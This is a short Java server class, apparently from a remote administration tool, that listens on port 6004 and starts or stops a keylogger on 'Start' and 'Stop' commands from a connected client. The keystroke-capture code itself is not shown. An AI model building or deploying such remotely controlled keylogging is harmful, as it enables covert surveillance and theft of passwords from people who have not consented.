package Server;

import Function.KeyLogger;

import java.net.ServerSocket;
import java.net.Socket;

public class HandleKeyLogger implements Runnable, SendRecv {
    @Override
    public void run() {
        ServerSocket ss;
        try {
            ss = new ServerSocket(6004);
            Socket s = ss.accept();
            String option;
            KeyLogger kl = new KeyLogger(s);
            do {
                option = SendRecv.getMess(s);
                if (option.equals("Start")) {
                    kl.startKeyLog();
                } else if (option.equals("Stop")) {
                    kl.stopKeyLogger();
                }
            } while (!option.equals("Stop"));
            s.close();
            ss.close();
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
}
